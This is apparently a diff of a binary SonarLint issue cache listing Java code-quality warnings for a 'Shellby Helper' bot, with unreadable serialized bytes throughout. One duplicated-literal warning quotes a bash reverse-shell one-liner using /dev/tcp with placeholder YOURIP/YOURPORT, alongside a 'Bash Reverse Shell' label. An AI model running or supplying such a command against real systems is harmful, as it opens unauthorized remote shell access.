@@ -1,70 +1,70 @@
 
-s	java:S117´"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8¥«¬Ä.
-m	java:S117"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(ñ™´8®Ç¤¬Ä.
+?
+java:S1116ÿ"Remove this empty statement.(ôŸìúÿÿÿÿ8¥«¬Ä.
+?
+java:S1116´"Remove this empty statement.(ôŸìúÿÿÿÿ8¥«¬Ä.
+N
+java:S1602e",Remove useless curly braces around statement(Ë˜üìøÿÿÿÿ8Şƒ¬Ä.
+s	java:S117«"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8¥«¬Ä.
+r	java:S117\"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8²Ÿ¦¬Ä.
+j
+java:S1192>"NDefine a constant instead of duplicating this literal "3\uFE0F\u20E3" 4 times.(³Â±B8˜‡ÕÄ.
+s	java:S117¶"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8¥«¬Ä.
+s	java:S117¿"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8¥«¬Ä.
+?
+java:S1116³"Remove this empty statement.(ôŸìúÿÿÿÿ8¥«¬Ä.
+s	java:S117‹"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8¥«¬Ä.
+?
+java:S1116€"Remove this empty statement.(ôŸìúÿÿÿÿ8¥«¬Ä.
 k
 java:S11921"NDefine a constant instead of duplicating this literal "2\uFE0F\u20E3" 8 times.(Ö€’8˜‡ÕÄ.
-?
-java:S1116ë"Remove this empty statement.(ôŸìúÿÿÿÿ8¥«¬Ä.
-s	java:S117÷"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8¥«¬Ä.
-s	java:S117‚"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8¥«¬Ä.
-g	java:S101"MRename this class name to match the regular expression '^[A-Z][a-zA-Z0-9]*$'.(Š—­Ôûÿÿÿÿ
-r	java:S117e"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8Şƒ¬Ä.
-s	java:S117—"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8¥«¬Ä.
-?
-java:S1116ˆ"Remove this empty statement.(ôŸìúÿÿÿÿ8¥«¬Ä.
-?
-java:S1116Ë"Remove this empty statement.(ôŸìúÿÿÿÿ8¥«¬Ä.
-r	java:S117y"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8¥«¬Ä.
-j
-java:S1192>"NDefine a constant instead of duplicating this literal "3\uFE0F\u20E3" 6 times.(³Â±B8˜‡ÕÄ.
-s	java:S117¿"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8¥«¬Ä.
->
-java:S1116v"Remove this empty statement.(ôŸìúÿÿÿÿ8¥«¬Ä.
-o	java:S120"ZRename this package name to match the regular expression '^[a-z_]+(\.[a-z_][a-z0-9_]*)*$'.(Ú×ø‘
-s	java:S117×"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8¥«¬Ä.
-w
-java:S1192-"UDefine a constant instead of duplicating this literal "**Use this code**\n " 6 times.(È™²¨ıÿÿÿÿ8¤ÉÓ­Ä.
-s	java:S117î"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8¥«¬Ä.
 “
 java:S1192"qDefine a constant instead of duplicating this literal "```bash -i >& /dev/tcp/YOURIP/YOURPORT 0>&1```\n" 3 times.(²Õæáùÿÿÿÿ8œòçÔÄ.
-?
-java:S1116¼"Remove this empty statement.(ôŸìúÿÿÿÿ8¥«¬Ä.
-?
-java:S1116‰"Remove this empty statement.(ôŸìúÿÿÿÿ8¥«¬Ä.
-s	java:S117‹"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8¥«¬Ä.
+o	java:S120"ZRename this package name to match the regular expression '^[a-z_]+(\.[a-z_][a-z0-9_]*)*$'.(Ú×ø‘
+O
+java:S1602î",Remove useless curly braces around statement(Ë˜üìøÿÿÿÿ8¥«¬Ä.
+o
+java:S1192}"RDefine a constant instead of duplicating this literal "Use this code \n" 14 times.(Å”•‡8¥«¬Ä.
+o
+java:S3776"RRefactor this method to reduce its Cognitive Complexity from 90 to the 15 allowed.(Âú8íÓª¬Ä.
+s	java:S117Î"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8¥«¬Ä.
+w
+java:S1192-"UDefine a constant instead of duplicating this literal "**Use this code**\n " 6 times.(È™²¨ıÿÿÿÿ8¤ÉÓ­Ä.
 p
-java:S1192`"SDefine a constant instead of duplicating this literal "Use this code  \n " 5 times.(Å”•‡8µÄ¸ÕÄ.
+java:S1192`"SDefine a constant instead of duplicating this literal "Use this code  \n " 4 times.(Å”•‡8µÄ¸ÕÄ.
+s	java:S117å"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8¥«¬Ä.
+s	java:S117ƒ"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8¥«¬Ä.
+r	java:S117"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(´‡çÉúÿÿÿÿ8Àò»•·.
 ?
-java:S1116½"Remove this empty statement.(ôŸìúÿÿÿÿ8¥«¬Ä.
+java:S1116Â"Remove this empty statement.(ôŸìúÿÿÿÿ8¥«¬Ä.
+s	java:S117¢"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8¥«¬Ä.
+l
+java:S1192)"ODefine a constant instead of duplicating this literal "1\uFE0F\u20E3" 12 times.(·ÉÓİ8˜‡ÕÄ.
+s	java:S117Å"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8¥«¬Ä.
+>
+java:S1116v"Remove this empty statement.(ôŸìúÿÿÿÿ8¥«¬Ä.
+O
+java:S1602",Remove useless curly braces around statement(Ë˜üìøÿÿÿÿ8¥«¬Ä.
 i
 java:S1192#"GDefine a constant instead of duplicating this literal "\u2754" 9 times.(†¼±¯úÿÿÿÿ8˜‡ÕÄ.
-s	java:S117”"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8¥«¬Ä.
-r	java:S117"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8š¬Ä.
-s	java:S117Î"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8¥«¬Ä.
-o
-java:S3776"RRefactor this method to reduce its Cognitive Complexity from 92 to the 15 allowed.(Âú8íÓª¬Ä.
+s	java:S117‚"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8¥«¬Ä.
+r	java:S117y"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8¥«¬Ä.
+r
+java:S1192"PDefine a constant instead of duplicating this literal "Shellby Helper" 16 times.(Œ¿ÉÚûÿÿÿÿ8·ş¼•·.
+s	java:S117î"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8¥«¬Ä.
+g	java:S101"MRename this class name to match the regular expression '^[A-Z][a-zA-Z0-9]*$'.(Š—­Ôûÿÿÿÿ
+y
+java:S1192"WDefine a constant instead of duplicating this literal "**Bash Reverse Shell**" 3 times.(‘³¶‡ÿÿÿÿÿ8“”ëÔÄ.
+s	java:S117"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8¥«¬Ä.
+s	java:S117‚"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8¥«¬Ä.
 p
 java:S1192F"NDefine a constant instead of duplicating this literal "\uD83C\uDFE0" 12 times.(°£ÿºıÿÿÿÿ8˜‡ÕÄ.
 >
 java:S1116X"Remove this empty statement.(ôŸìúÿÿÿÿ8¡õ²•·.
-r	java:S117\"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8²Ÿ¦¬Ä.
-s	java:S117È"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8¥«¬Ä.
-O
-java:S1602÷",Remove useless curly braces around statement(Ë˜üìøÿÿÿÿ8¥«¬Ä.
-t
-java:S1192}"RDefine a constant instead of duplicating this literal "Use this code \n" 14 times.(úØ°­øÿÿÿÿ8¥«¬Ä.
-l
-java:S1192)"ODefine a constant instead of duplicating this literal "1\uFE0F\u20E3" 12 times.(·ÉÓİ8˜‡ÕÄ.
-O
-java:S1602—",Remove useless curly braces around statement(Ë˜üìøÿÿÿÿ8¥«¬Ä.
 ?
-java:S1116§"Remove this empty statement.(ôŸìúÿÿÿÿ8¥«¬Ä.
-r
-java:S1192"PDefine a constant instead of duplicating this literal "Shellby Helper" 16 times.(Œ¿ÉÚûÿÿÿÿ8·ş¼•·.
-s	java:S117«"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8¥«¬Ä.
-s	java:S117Œ"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(£¡õøÿÿÿÿ8¥«¬Ä.
-r	java:S117"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(´‡çÉúÿÿÿÿ8Àò»•·.
-y
-java:S1192"WDefine a constant instead of duplicating this literal "**Bash Reverse Shell**" 3 times.(‘³¶‡ÿÿÿÿÿ8“”ëÔÄ.
-N
-java:S1602e",Remove useless curly braces around statement(Ë˜üìøÿÿÿÿ8Şƒ¬Ä.
+java:S1116â"Remove this empty statement.(ôŸìúÿÿÿÿ8¥«¬Ä.
+?
+java:S1116"Remove this empty statement.(ôŸìúÿÿÿÿ8¥«¬Ä.
+r	java:S117e"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8Şƒ¬Ä.
+m	java:S117"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(ñ™´8®Ç¤¬Ä.
+r	java:S117"QRename this local variable to match the regular expression '^[a-z][a-zA-Z0-9]*$'.(Ë˜üìøÿÿÿÿ8š¬Ä.
